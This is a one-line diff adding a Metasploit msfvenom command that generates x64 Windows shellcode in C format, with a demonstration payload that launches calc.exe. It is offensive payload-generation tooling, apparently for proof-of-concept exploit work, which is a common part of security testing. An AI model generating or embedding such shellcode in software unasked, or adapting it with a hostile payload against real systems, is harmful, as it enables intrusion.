@@ -1,0 +1,1 @@
+msfvenom --payload windows/x64/exec CMD="calc.exe" EXITFUNC="thread" -a x64 --platform windows -f c
